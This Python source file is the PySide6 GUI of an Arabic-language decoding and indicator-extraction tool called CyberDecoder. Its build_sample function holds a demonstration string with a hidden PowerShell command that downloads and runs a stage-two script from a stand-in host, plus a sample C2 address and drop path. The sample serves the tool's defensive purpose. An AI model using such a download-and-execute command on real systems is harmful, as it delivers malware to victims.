"""CyberDecoder GUI (PySide6). RTL chrome, LTR data views."""
from __future__ import annotations

import base64
import gzip
import html as htmllib
import json
import traceback
from pathlib import Path
from urllib.parse import quote

from PySide6.QtCore import QSettings, Qt, QThread, QTimer, Signal
from PySide6.QtGui import (QColor, QFont, QFontDatabase, QGuiApplication, QKeySequence, QShortcut,
                           QTextOption)
from PySide6.QtWidgets import (
    QAbstractItemView, QApplication, QCheckBox, QFileDialog, QHBoxLayout, QHeaderView, QLabel,
    QMainWindow, QMenu, QMessageBox, QPlainTextEdit, QPushButton, QSpinBox, QSplitter, QStatusBar,
    QTableWidget, QTableWidgetItem, QTabWidget, QTextBrowser, QToolButton, QTreeWidget,
    QTreeWidgetItem, QVBoxLayout, QWidget,
)

from . import APP_NAME, __version__, engine, interpret, report, theme
from . import ioc as iocmod

MAX_FILE_BYTES = 5 * 1024 * 1024
BINARY_PLACEHOLDER = "[ملف ثنائي: {name} — {size} بايت]\nسيتم تحليله مباشرة عند الضغط على «تحليل»."

T_OUTPUT, T_LAYERS, T_IOC, T_EMBEDDED, T_FINDINGS, T_REPORT = range(6)
TAB_TITLES = ["الناتج النهائي", "الطبقات", "المؤشرات", "مقاطع مضمّنة", "ملاحظات", "التقرير"]


# ------------------------------------------------------------------ helpers

def pick_fonts() -> tuple[str, str]:
    fams = set(QFontDatabase.families())
    ui = next((f for f in ("Segoe UI", "Tahoma", "Noto Sans Arabic", "DejaVu Sans", "Arial") if f in fams),
              QFontDatabase.systemFont(QFontDatabase.SystemFont.GeneralFont).family())
    mono = next((f for f in ("Cascadia Mono", "Consolas", "JetBrains Mono", "DejaVu Sans Mono", "Courier New")
                 if f in fams), QFontDatabase.systemFont(QFontDatabase.SystemFont.FixedFont).family())
    return ui, mono


def build_sample() -> str:
    """A nested example: Base64( Gzip( Base64( URL-encode( text ) ) ) )."""
    text = (
        "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)"
        ".DownloadString('http://update-check.example.net/stage2.ps1')\"\n"
        "C2 callback: 185.220.101.45:443 | drop path: C:\\Users\\Public\\Libraries\\svc.exe\n"
        "contact: ops@evil-mail.org"
    )
    l1 = quote(text, safe="")
    l2 = base64.b64encode(l1.encode()).decode()
    l3 = gzip.compress(l2.encode())
    return base64.b64encode(l3).decode()


class DropTextEdit(QPlainTextEdit):
    filesDropped = Signal(list)

    def dragEnterEvent(self, e):
        if e.mimeData().hasUrls():
            e.acceptProposedAction()
        else:
            super().dragEnterEvent(e)

    def dragMoveEvent(self, e):
        if e.mimeData().hasUrls():
            e.acceptProposedAction()
        else:
            super().dragMoveEvent(e)

    def dropEvent(self, e):
        if e.mimeData().hasUrls():
            paths = [u.toLocalFile() for u in e.mimeData().urls() if u.isLocalFile()]
            if paths:
                self.filesDropped.emit(paths)
                e.acceptProposedAction()
                return
        super().dropEvent(e)


class AnalyzeWorker(QThread):
    done = Signal(object)
    failed = Signal(str)

    def __init__(self, data: bytes, source: str, depth: int, conf: int, parent=None):
        super().__init__(parent)
        self._args = (data, source, depth, conf)

    def run(self):
        try:
            data, source, depth, conf = self._args
            self.done.emit(engine.analyze(data, source=source, max_depth=depth, min_conf=conf))
        except Exception:
            self.failed.emit(traceback.format_exc())


# ------------------------------------------------------------------ main window

class MainWindow(QMainWindow):
    def __init__(self, icon=None):
        super().__init__()
        self.setWindowTitle(f"{APP_NAME} {__version__}  —  محلّل ومفكّك البيانات")
        if icon is not None:
            self.setWindowIcon(icon)
        self.resize(1300, 820)
        self.setMinimumSize(960, 620)
        self.setAcceptDrops(True)

        self.settings = QSettings(QSettings.Format.IniFormat, QSettings.Scope.UserScope, "CyberDecoder", "CyberDecoder")
        _, self.mono_family = pick_fonts()

        self._analysis: engine.Analysis | None = None
        self._file_bytes: bytes | None = None
        self._source_name = "إدخال يدوي"
        self._programmatic = False
        self._worker: AnalyzeWorker | None = None
        self._pending = False
        self._layer_rows: list[tuple[bytes, str]] = []
        self._embedded_rows: list[engine.Embedded] = []

        self._auto_timer = QTimer(self)
        self._auto_timer.setSingleShot(True)
        self._auto_timer.setInterval(450)
        self._auto_timer.timeout.connect(self.run_analysis)

        self._build_ui()
        self._bind_shortcuts()
        self._restore_settings()
        self._clear_results()

    # ---------------------------------------------------------------- UI construction
    def _mono(self, read_only: bool = False, wrap: bool = True) -> QPlainTextEdit:
        w = QPlainTextEdit()
        f = QFont(self.mono_family)
        f.setPointSize(10)
        w.setFont(f)
        w.setLayoutDirection(Qt.LayoutDirection.LeftToRight)
        w.setReadOnly(read_only)
        w.setLineWrapMode(QPlainTextEdit.LineWrapMode.WidgetWidth if wrap else QPlainTextEdit.LineWrapMode.NoWrap)
        return w

    def _build_ui(self) -> None:
        root = QWidget()
        self.setCentralWidget(root)
        outer = QVBoxLayout(root)
        outer.setContentsMargins(16, 12, 16, 10)
        outer.setSpacing(10)

        # ---- top bar
        bar = QHBoxLayout()
        bar.setSpacing(8)
        title_box = QVBoxLayout()
        title_box.setSpacing(0)
        t = QLabel(APP_NAME)
        t.setObjectName("appTitle")
        s = QLabel("فك وتحليل البيانات تلقائيًا — يعمل بدون إنترنت")
        s.setObjectName("muted")
        title_box.addWidget(t)
        title_box.addWidget(s)
        bar.addLayout(title_box)
        bar.addStretch(1)

        self.btn_open = QPushButton("فتح ملف")
        self.btn_open.setToolTip("Ctrl+O — يقبل TXT / LOG / JSON وأي ملف ثنائي صغير")
        self.btn_paste = QPushButton("لصق من الحافظة")
        self.btn_paste.setToolTip("Ctrl+Shift+V — يلصق ويحلّل مباشرة")
        self.btn_clear = QPushButton("مسح")
        self.btn_clear.setToolTip("Ctrl+L")
        self.btn_copy = QPushButton("نسخ الناتج")
        self.btn_copy.setToolTip("Ctrl+Shift+C")
        self.btn_export = QToolButton()
        self.btn_export.setText("تصدير")
        self.btn_export.setPopupMode(QToolButton.ToolButtonPopupMode.InstantPopup)
        menu = QMenu(self.btn_export)
        menu.addAction("تقرير نصي (TXT)…", lambda: self.export_report("txt"))
        menu.addAction("تقرير JSON…", lambda: self.export_report("json"))
        menu.addSeparator()
        menu.addAction("حفظ الناتج الخام (Raw)…", self.save_raw_output)
        self.btn_export.setMenu(menu)
        self.btn_analyze = QPushButton("تحليل")
        self.btn_analyze.setObjectName("primary")
        self.btn_analyze.setToolTip("Ctrl+Enter")

        for b in (self.btn_open, self.btn_paste, self.btn_clear, self.btn_copy, self.btn_export, self.btn_analyze):
            bar.addWidget(b)
        outer.addLayout(bar)

        # ---- body: input | results   (RTL: input appears on the right)
        split = QSplitter(Qt.Orientation.Horizontal)
        split.setChildrenCollapsible(False)
        outer.addWidget(split, 1)

        left = QWidget()
        lv = QVBoxLayout(left)
        lv.setContentsMargins(0, 0, 0, 0)
        lv.setSpacing(6)
        head = QHBoxLayout()
        lbl = QLabel("الإدخال")
        lbl.setObjectName("panelTitle")
        head.addWidget(lbl)
        head.addStretch(1)
        self.btn_sample = QPushButton("تحميل مثال")
        self.btn_sample.setObjectName("flat")
        self.btn_sample.setCursor(Qt.CursorShape.PointingHandCursor)
        head.addWidget(self.btn_sample)
        lv.addLayout(head)

        self.input = DropTextEdit()
        self.input.setFont(self._mono().font())
        self.input.setLayoutDirection(Qt.LayoutDirection.LeftToRight)
        self.input.setLineWrapMode(QPlainTextEdit.LineWrapMode.WidgetWidth)
        self.input.setWordWrapMode(QTextOption.WrapMode.WrapAnywhere)
        self.input.setPlaceholderText("الصق النص المشفّر هنا، أو اسحب ملفًا وأفلته على النافذة…\n"
                                      "Base64 · Hex · URL · Unicode · JWT · Gzip · JSON")
        lv.addWidget(self.input, 1)

        opts = QHBoxLayout()
        opts.setSpacing(10)
        self.spin_depth = QSpinBox()
        self.spin_depth.setRange(1, 40)
        self.spin_depth.setValue(engine.DEFAULT_MAX_DEPTH)
        self.spin_depth.setToolTip("الحد الأقصى لعدد الطبقات المتتالية (حماية من التكرار اللانهائي)")
        self.spin_conf = QSpinBox()
        self.spin_conf.setRange(10, 95)
        self.spin_conf.setSuffix("%")
        self.spin_conf.setValue(engine.DEFAULT_MIN_CONF)
        self.spin_conf.setToolTip("لا تُطبَّق طبقة فك إلا إذا كانت ثقة الكشف أعلى من هذا الحد")
        self.chk_auto = QCheckBox("تحليل تلقائي أثناء الكتابة")
        opts.addWidget(QLabel("أقصى عمق"))
        opts.addWidget(self.spin_depth)
        opts.addWidget(QLabel("حد الثقة"))
        opts.addWidget(self.spin_conf)
        opts.addStretch(1)
        opts.addWidget(self.chk_auto)
        lv.addLayout(opts)
        split.addWidget(left)

        right = QWidget()
        rv = QVBoxLayout(right)
        rv.setContentsMargins(0, 0, 0, 0)
        rv.setSpacing(8)
        self.banner = QLabel()
        self.banner.setObjectName("banner")
        self.banner.setWordWrap(True)
        self.banner.setTextFormat(Qt.TextFormat.RichText)
        self.banner.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        rv.addWidget(self.banner)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(False)
        self.tabs.tabBar().setUsesScrollButtons(False)
        self.tabs.tabBar().setExpanding(False)
        rv.addWidget(self.tabs, 1)
        split.addWidget(right)
        split.setStretchFactor(0, 4)
        split.setStretchFactor(1, 6)
        split.setSizes([500, 800])
        split.setChildrenCollapsible(False)
        right.setMinimumWidth(520)
        self.splitter = split

        # tab: output
        self.out_view = self._mono(read_only=True)
        self.tabs.addTab(self.out_view, TAB_TITLES[T_OUTPUT])

        # tab: layers
        self.layer_table = QTableWidget(0, 6)
        self.layer_table.setHorizontalHeaderLabels(["#", "الطريقة", "الثقة", "النوع الناتج", "الحجم", "ملاحظات"])
        self._setup_table(self.layer_table)
        self.layer_preview = self._mono(read_only=True)
        lsplit = QSplitter(Qt.Orientation.Vertical)
        lsplit.addWidget(self.layer_table)
        lsplit.addWidget(self.layer_preview)
        lsplit.setStretchFactor(0, 4)
        lsplit.setStretchFactor(1, 5)
        self.tabs.addTab(lsplit, TAB_TITLES[T_LAYERS])
        self.layer_table.currentCellChanged.connect(lambda r, *_: self._show_layer_preview(r))

        # tab: IOC
        iw = QWidget()
        iv = QVBoxLayout(iw)
        iv.setContentsMargins(8, 8, 8, 8)
        ihead = QHBoxLayout()
        self.ioc_hint = QLabel("انقر مرتين على أي قيمة لنسخها")
        self.ioc_hint.setObjectName("muted")
        ihead.addWidget(self.ioc_hint)
        ihead.addStretch(1)
        self.btn_copy_ioc = QPushButton("نسخ كل المؤشرات")
        ihead.addWidget(self.btn_copy_ioc)
        iv.addLayout(ihead)
        self.ioc_tree = QTreeWidget()
        self.ioc_tree.setHeaderLabels(["Value", "Source"])
        self.ioc_tree.setLayoutDirection(Qt.LayoutDirection.LeftToRight)
        self.ioc_tree.setAlternatingRowColors(True)
        self.ioc_tree.setUniformRowHeights(True)
        self.ioc_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.ioc_tree.header().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.ioc_tree.header().setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        iv.addWidget(self.ioc_tree, 1)
        self.tabs.addTab(iw, TAB_TITLES[T_IOC])

        # tab: embedded
        self.emb_table = QTableWidget(0, 5)
        self.emb_table.setHorizontalHeaderLabels(["#", "الموضع", "مسار الفك", "المقطع الأصلي", "الناتج"])
        self.emb_table.setLayoutDirection(Qt.LayoutDirection.LeftToRight)
        self._setup_table(self.emb_table)
        self.emb_preview = self._mono(read_only=True)
        esplit = QSplitter(Qt.Orientation.Vertical)
        esplit.addWidget(self.emb_table)
        esplit.addWidget(self.emb_preview)
        esplit.setStretchFactor(0, 4)
        esplit.setStretchFactor(1, 5)
        self.tabs.addTab(esplit, TAB_TITLES[T_EMBEDDED])
        self.emb_table.currentCellChanged.connect(lambda r, *_: self._show_embedded_preview(r))

        # tab: findings
        self.findings_view = QTextBrowser()
        self.findings_view.setOpenLinks(False)
        self.tabs.addTab(self.findings_view, TAB_TITLES[T_FINDINGS])

        # tab: report
        self.report_view = self._mono(read_only=True)
        self.tabs.addTab(self.report_view, TAB_TITLES[T_REPORT])

        self.setStatusBar(QStatusBar())

        # wiring
        self.btn_open.clicked.connect(self.open_file_dialog)
        self.btn_paste.clicked.connect(self.paste_clipboard)
        self.btn_clear.clicked.connect(self.clear_all)
        self.btn_copy.clicked.connect(self.copy_output)
        self.btn_analyze.clicked.connect(self.run_analysis)
        self.btn_sample.clicked.connect(self.load_sample)
        self.btn_copy_ioc.clicked.connect(self.copy_all_iocs)
        self.input.textChanged.connect(self._on_text_changed)
        self.input.filesDropped.connect(lambda paths: self.load_file(paths[0]))
        self.ioc_tree.itemDoubleClicked.connect(self._copy_ioc_item)
        self.ioc_tree.customContextMenuRequested.connect(self._ioc_menu)

    def _setup_table(self, t: QTableWidget) -> None:
        t.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        t.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        t.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        t.setAlternatingRowColors(True)
        t.verticalHeader().setVisible(False)
        t.setShowGrid(False)
        t.setWordWrap(False)
        h = t.horizontalHeader()
        h.setStretchLastSection(True)
        h.setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)

    def _bind_shortcuts(self) -> None:
        def sc(seq, fn):
            QShortcut(QKeySequence(seq), self, activated=fn)
        sc("Ctrl+Return", self.run_analysis)
        sc("Ctrl+Enter", self.run_analysis)
        sc("Ctrl+O", self.open_file_dialog)
        sc("Ctrl+Shift+V", self.paste_clipboard)
        sc("Ctrl+L", self.clear_all)
        sc("Ctrl+Shift+C", self.copy_output)

    # ---------------------------------------------------------------- settings
    def _restore_settings(self) -> None:
        geo = self.settings.value("geometry")
        if geo is not None:
            self.restoreGeometry(geo)
        try:
            self.spin_depth.setValue(int(self.settings.value("max_depth", engine.DEFAULT_MAX_DEPTH)))
            self.spin_conf.setValue(int(self.settings.value("min_conf", engine.DEFAULT_MIN_CONF)))
        except (TypeError, ValueError):
            pass
        self.chk_auto.setChecked(str(self.settings.value("auto", "false")).lower() == "true")

    def closeEvent(self, e) -> None:
        self.settings.setValue("geometry", self.saveGeometry())
        self.settings.setValue("max_depth", self.spin_depth.value())
        self.settings.setValue("min_conf", self.spin_conf.value())
        self.settings.setValue("auto", self.chk_auto.isChecked())
        if self._worker and self._worker.isRunning():
            self._worker.wait(4000)
        super().closeEvent(e)

    # ---------------------------------------------------------------- drag & drop on the whole window
    def dragEnterEvent(self, e):
        if e.mimeData().hasUrls():
            e.acceptProposedAction()

    def dropEvent(self, e):
        paths = [u.toLocalFile() for u in e.mimeData().urls() if u.isLocalFile()]
        if paths:
            self.load_file(paths[0])
            e.acceptProposedAction()

    # ---------------------------------------------------------------- input handling
    def _set_input_text(self, text: str) -> None:
        self._programmatic = True
        self.input.setPlainText(text)
        self._programmatic = False

    def _on_text_changed(self) -> None:
        if self._programmatic:
            return
        self._file_bytes = None
        self._source_name = "إدخال يدوي"
        if self.chk_auto.isChecked():
            self._auto_timer.start()

    def _current_input(self) -> tuple[bytes, str]:
        if self._file_bytes is not None:
            return self._file_bytes, self._source_name
        return self.input.toPlainText().encode("utf-8"), self._source_name

    def open_file_dialog(self) -> None:
        path, _ = QFileDialog.getOpenFileName(self, "فتح ملف", "", "كل الملفات (*.*);;نصوص (*.txt *.log *.json *.csv)")
        if path:
            self.load_file(path)

    def load_file(self, path: str) -> None:
        p = Path(path)
        try:
            if not p.is_file():
                self._toast("المسار المحدد ليس ملفًا.")
                return
            if p.stat().st_size > MAX_FILE_BYTES:
                QMessageBox.warning(self, APP_NAME, f"الملف أكبر من {MAX_FILE_BYTES // 1024 // 1024} MB.\n"
                                                    "الأداة مخصصة للملفات الصغيرة (TXT / LOG / JSON).")
                return
            data = p.read_bytes()
        except OSError as exc:
            QMessageBox.critical(self, APP_NAME, f"تعذّرت قراءة الملف:\n{exc}")
            return

        text, _enc = engine.decode_text(data)
        note = ""
        if text is not None and engine.printable_ratio(text) >= 0.9:
            self._set_input_text(text)
            self._file_bytes = data
        elif self._looks_legacy_text(data):
            text = data.decode("latin-1")
            self._set_input_text(text)
            self._file_bytes = text.encode("utf-8")
            note = " (ترميز غير UTF-8، قُرئ كـ Latin-1)"
        else:
            self._set_input_text(BINARY_PLACEHOLDER.format(name=p.name, size=len(data)))
            self._file_bytes = data
        self._source_name = p.name
        self._toast(f"تم تحميل {p.name}{note}")
        self.run_analysis()

    @staticmethod
    def _looks_legacy_text(data: bytes) -> bool:
        sample = data[:8192]
        if not sample or b"\x00" in sample:
            return False
        ctrl = sum(1 for b in sample if b < 9 or 13 < b < 32)
        return ctrl / len(sample) < 0.02

    def paste_clipboard(self) -> None:
        cb = QGuiApplication.clipboard()
        md = cb.mimeData()
        if md is not None and md.hasUrls() and any(u.isLocalFile() for u in md.urls()):
            self.load_file(next(u.toLocalFile() for u in md.urls() if u.isLocalFile()))
            return
        text = cb.text()
        if not text.strip():
            self._toast("الحافظة فارغة.")
            return
        self._set_input_text(text)
        self._file_bytes = None
        self._source_name = "الحافظة"
        self.run_analysis()

    def load_sample(self) -> None:
        self._set_input_text(build_sample())
        self._file_bytes = None
        self._source_name = "مثال"
        self.run_analysis()

    def clear_all(self) -> None:
        self._set_input_text("")
        self._file_bytes = None
        self._source_name = "إدخال يدوي"
        self._clear_results()
        self.input.setFocus()

    # ---------------------------------------------------------------- analysis
    def run_analysis(self) -> None:
        self._auto_timer.stop()
        data, name = self._current_input()
        if not data.strip():
            self._clear_results()
            return
        if self._worker is not None and self._worker.isRunning():
            self._pending = True
            return
        self.btn_analyze.setEnabled(False)
        self.statusBar().showMessage("جارٍ التحليل…")
        w = AnalyzeWorker(data, name, self.spin_depth.value(), self.spin_conf.value(), self)
        w.done.connect(self._on_done)
        w.failed.connect(self._on_failed)
        w.finished.connect(self._on_worker_finished)
        self._worker = w
        w.start()

    def _on_worker_finished(self) -> None:
        self.btn_analyze.setEnabled(True)
        if self._pending:
            self._pending = False
            self.run_analysis()

    def _on_failed(self, tb: str) -> None:
        self.statusBar().showMessage("فشل التحليل")
        QMessageBox.critical(self, APP_NAME, "حدث خطأ غير متوقع أثناء التحليل:\n\n" + tb[-1500:])

    def _on_done(self, a: engine.Analysis) -> None:
        self._analysis = a
        self._render(a)
        self.statusBar().showMessage(
            f"تم — {a.decode_layer_count} طبقة فك · {a.ioc_count} مؤشر · {len(a.embedded)} مقطع مضمّن · "
            f"{a.elapsed_ms:.0f} ms"
        )

    # ---------------------------------------------------------------- rendering
    def _chip(self, text: str, bg: str, fg: str = "#10151F") -> str:
        return (f'<span style="background-color:{bg}; color:{fg}; font-weight:600;">'
                f'&nbsp;&nbsp;{htmllib.escape(text)}&nbsp;&nbsp;</span>')

    def _chain_html(self, a: engine.Analysis) -> str:
        parts = [self._chip("Input", theme.LINE, theme.TEXT)]
        for l in a.layers:
            parts.append(self._chip(l.method, theme.confidence_color(l.confidence)))
        parts.append(self._chip(a.final_type, theme.SKY))
        sep = f'<span style="color:{theme.MUTED};">&nbsp;▸&nbsp;</span>'
        return f'<div dir="ltr" style="line-height:150%;">{sep.join(parts)}</div>'

    def _render(self, a: engine.Analysis) -> None:
        lines = interpret.summarize(a)
        body = "<br>".join(htmllib.escape(l) for l in lines)
        hints = "".join(f'<br><span style="color:{theme.MUTED};">• {htmllib.escape(h)}</span>' for h in a.hints)
        self.banner.setText(f'{self._chain_html(a)}<div dir="rtl" style="margin-top:8px;">{body}{hints}</div>')

        self.out_view.setPlainText(report.final_view(a))
        self._fill_layers(a)
        self._fill_iocs(a)
        self._fill_embedded(a)
        self._fill_findings(a)
        self.report_view.setPlainText(report.build_text_report(a))

        self.tabs.setTabText(T_LAYERS, f"{TAB_TITLES[T_LAYERS]} ({len(a.layers)})")
        self.tabs.setTabText(T_IOC, f"{TAB_TITLES[T_IOC]} ({a.ioc_count})")
        self.tabs.setTabText(T_EMBEDDED, f"{TAB_TITLES[T_EMBEDDED]} ({len(a.embedded)})")
        self.tabs.setTabText(T_FINDINGS, f"{TAB_TITLES[T_FINDINGS]} ({len(a.findings)})")

    def _item(self, text: str, color: str | None = None, center: bool = False, tip: str | None = None) -> QTableWidgetItem:
        it = QTableWidgetItem(text)
        if color:
            it.setForeground(QColor(color))
        if center:
            it.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        if tip:
            it.setToolTip(tip)
        return it

    def _fill_layers(self, a: engine.Analysis) -> None:
        t = self.layer_table
        t.setRowCount(0)
        self._layer_rows = []
        rows = [(a.original, a.original_type)]
        rows += [(l.data, l.out_type) for l in a.layers]
        t.setRowCount(len(rows))

        detail0 = f" · {a.original_detail}" if a.original_detail else ""
        t.setItem(0, 0, self._item("0", center=True))
        t.setItem(0, 1, self._item("Input", theme.MUTED, center=True))
        t.setItem(0, 2, self._item("—", theme.MUTED, center=True))
        t.setItem(0, 3, self._item(f"{a.original_type}{detail0}", center=True))
        t.setItem(0, 4, self._item("\u200e" + engine.fmt_size(len(a.original)), center=True))
        t.setItem(0, 5, self._item("الإدخال الأصلي", theme.MUTED))
        self._layer_rows.append((a.original, a.original_type))

        for i, l in enumerate(a.layers, start=1):
            detail = f" · {l.out_detail}" if l.out_detail else ""
            notes = " — ".join(l.notes)
            t.setItem(i, 0, self._item(str(l.index), center=True))
            t.setItem(i, 1, self._item(l.method, theme.TEXT, center=True))
            t.setItem(i, 2, self._item(f"{l.confidence}%", theme.confidence_color(l.confidence), center=True))
            t.setItem(i, 3, self._item(f"{l.out_type}{detail}", center=True))
            t.setItem(i, 4, self._item("\u200e" + engine.fmt_size(l.out_size), center=True))
            t.setItem(i, 5, self._item(notes, tip=notes or None))
            self._layer_rows.append((l.data, l.out_type))
        t.resizeColumnsToContents()
        t.setCurrentCell(len(rows) - 1, 1)
        self._show_layer_preview(len(rows) - 1)

    def _show_layer_preview(self, row: int) -> None:
        if 0 <= row < len(self._layer_rows):
            data, typ = self._layer_rows[row]
            self.layer_preview.setPlainText(report.display_text(data, binary=(typ == "Binary")))

    def _fill_iocs(self, a: engine.Analysis) -> None:
        tree = self.ioc_tree
        tree.clear()
        bold = QFont(self.font())
        bold.setBold(True)
        for typ, items in a.iocs.items():
            top = QTreeWidgetItem([f"{iocmod.TYPE_LABELS[typ]}  ({len(items)})", ""])
            top.setFont(0, bold)
            top.setForeground(0, QColor(theme.AMBER))
            for value, src in items:
                child = QTreeWidgetItem([value, src])
                child.setForeground(1, QColor(theme.MUTED))
                top.addChild(child)
            tree.addTopLevelItem(top)
            top.setExpanded(True)
        self.ioc_hint.setText("انقر مرتين على أي قيمة لنسخها" if a.ioc_count else "لا توجد مؤشرات في هذه النتيجة")
        self.btn_copy_ioc.setEnabled(bool(a.ioc_count))

    def _fill_embedded(self, a: engine.Analysis) -> None:
        t = self.emb_table
        t.setRowCount(0)
        self._embedded_rows = list(a.embedded)
        t.setRowCount(len(a.embedded))
        for i, e in enumerate(a.embedded):
            chain = " › ".join(l.method for l in e.analysis.layers)
            tok = e.token if len(e.token) <= 48 else e.token[:45] + "…"
            dec = report.display_text(e.analysis.final, 200, binary=(e.analysis.final_type == "Binary"))
            dec = " ".join(dec.split())[:90]
            t.setItem(i, 0, self._item(str(i + 1), center=True))
            t.setItem(i, 1, self._item(str(e.offset), center=True))
            t.setItem(i, 2, self._item(chain, theme.TEAL))
            t.setItem(i, 3, self._item(tok, theme.MUTED, tip=e.token[:500]))
            t.setItem(i, 4, self._item(dec))
        self.emb_preview.setPlainText("")
        if a.embedded:
            t.setCurrentCell(0, 0)
            self._show_embedded_preview(0)

    def _show_embedded_preview(self, row: int) -> None:
        if 0 <= row < len(self._embedded_rows):
            e = self._embedded_rows[row]
            self.emb_preview.setPlainText(
                report.display_text(e.analysis.final, binary=(e.analysis.final_type == "Binary")))

    def _fill_findings(self, a: engine.Analysis) -> None:
        if not a.findings:
            self.findings_view.setHtml(
                f'<div dir="rtl" style="color:{theme.MUTED}; padding:8px;">لم يتم رصد أي أنماط مشبوهة معروفة في النتيجة.</div>')
            return
        rows = []
        for f in a.findings:
            color = theme.LEVEL_COLORS[f.level]
            ev = (f'<div dir="ltr" style="color:{theme.MUTED}; font-family:\'{self.mono_family}\'; '
                  f'margin-top:2px;">{htmllib.escape(f.evidence)}</div>') if f.evidence else ""
            rows.append(
                f'<div dir="rtl" style="margin:0 0 12px 0;">'
                f'<span style="background-color:{color}; color:#10151F; font-weight:700;">'
                f'&nbsp;{interpret.LEVEL_AR[f.level]}&nbsp;</span>&nbsp; <b>{htmllib.escape(f.title)}</b>{ev}</div>')
        note = (f'<div dir="rtl" style="color:{theme.MUTED}; margin-top:6px;">'
                'هذه مؤشرات إرشادية مبنية على أنماط نصية، وليست حكمًا نهائيًا.</div>')
        self.findings_view.setHtml("".join(rows) + note)

    def _clear_results(self) -> None:
        self._analysis = None
        self.banner.setText(
            f'<div dir="rtl" style="color:{theme.MUTED};">الصق بيانات مشفّرة أو اسحب ملفًا، ثم اضغط '
            f'<b style="color:{theme.AMBER};">تحليل</b> (Ctrl+Enter). '
            'ستُكتشف الطبقات وتُفكّ تلقائيًا وتُستخرج المؤشرات.</div>')
        for w in (self.out_view, self.layer_preview, self.emb_preview, self.report_view):
            w.setPlainText("")
        self.layer_table.setRowCount(0)
        self.emb_table.setRowCount(0)
        self.ioc_tree.clear()
        self.findings_view.setHtml("")
        self._layer_rows, self._embedded_rows = [], []
        self.btn_copy_ioc.setEnabled(False)
        self.ioc_hint.setText("")
        for i, title in enumerate(TAB_TITLES):
            self.tabs.setTabText(i, title)
        self.statusBar().showMessage("جاهز")

    # ---------------------------------------------------------------- copy / export
    def _toast(self, msg: str) -> None:
        self.statusBar().showMessage(msg, 5000)

    def _copy(self, text: str, what: str) -> None:
        QGuiApplication.clipboard().setText(text)
        self._toast(f"تم نسخ {what}")

    def copy_output(self) -> None:
        a = self._analysis
        if not a:
            self._toast("لا يوجد ناتج لنسخه.")
            return
        if a.final_type == "Binary":
            self._copy(a.final.hex(), "الناتج (Hex)")
            return
        text, _ = engine.decode_text(a.final)
        self._copy(text or "", "الناتج")

    def copy_all_iocs(self) -> None:
        a = self._analysis
        if not a or not a.ioc_count:
            return
        lines = [v for items in a.iocs.values() for v, _ in items]
        self._copy("\n".join(lines), f"{len(lines)} مؤشر")

    def _copy_ioc_item(self, item: QTreeWidgetItem, _col: int) -> None:
        if item.parent() is not None:
            self._copy(item.text(0), "القيمة")

    def _ioc_menu(self, pos) -> None:
        item = self.ioc_tree.itemAt(pos)
        if item is None:
            return
        m = QMenu(self)
        if item.parent() is not None:
            m.addAction("نسخ القيمة", lambda: self._copy(item.text(0), "القيمة"))
        else:
            vals = [item.child(i).text(0) for i in range(item.childCount())]
            m.addAction(f"نسخ كل قيم «{item.text(0).split('  ')[0]}»", lambda: self._copy("\n".join(vals), "القيم"))
        m.exec(self.ioc_tree.viewport().mapToGlobal(pos))

    def _default_stem(self) -> str:
        a = self._analysis
        stem = Path(a.source).stem if a and a.source else ""
        return stem if stem and stem not in ("input", "إدخال يدوي", "الحافظة") else "cyberdecoder"

    def export_report(self, fmt: str) -> None:
        a = self._analysis
        if not a:
            self._toast("نفّذ التحليل أولًا.")
            return
        flt = "Text (*.txt)" if fmt == "txt" else "JSON (*.json)"
        path, _ = QFileDialog.getSaveFileName(self, "تصدير التقرير", f"{self._default_stem()}_report.{fmt}", flt)
        if not path:
            return
        try:
            if fmt == "txt":
                Path(path).write_text(report.build_text_report(a), encoding="utf-8-sig")
            else:
                Path(path).write_text(json.dumps(report.build_json_report(a), ensure_ascii=False, indent=2),
                                      encoding="utf-8")
        except OSError as exc:
            QMessageBox.critical(self, APP_NAME, f"تعذّر حفظ الملف:\n{exc}")
            return
        self._toast(f"تم حفظ التقرير: {path}")

    def save_raw_output(self) -> None:
        a = self._analysis
        if not a:
            self._toast("نفّذ التحليل أولًا.")
            return
        ext = {"JSON": "json", "Text": "txt", "URL": "txt", "IP": "txt"}.get(a.final_type, "bin")
        path, _ = QFileDialog.getSaveFileName(self, "حفظ الناتج الخام", f"{self._default_stem()}_decoded.{ext}",
                                              "كل الملفات (*.*)")
        if not path:
            return
        try:
            Path(path).write_bytes(a.final)
        except OSError as exc:
            QMessageBox.critical(self, APP_NAME, f"تعذّر حفظ الملف:\n{exc}")
            return
        self._toast(f"تم حفظ الناتج: {path}")
